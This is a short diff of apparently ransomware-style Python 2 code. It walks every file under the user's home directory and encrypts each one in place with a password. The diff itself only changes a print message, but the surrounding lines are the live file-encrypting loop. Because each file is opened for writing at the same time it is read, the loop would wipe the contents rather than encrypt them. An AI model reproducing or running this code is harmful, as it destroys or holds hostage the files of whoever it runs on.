@@ -34,7 +34,7 @@ for path, subdirs, files in os.walk(homedir):
     for name in files:
         glofile = os.path.join(path, name)
         if os.path.isdir(glofile):
-            print "This is dir"
+            print "This is directory"
         else:
             with open(glofile, 'rb') as in_file, open(glofile, 'wb') as out_file:
                 encrypt(in_file, out_file, password)
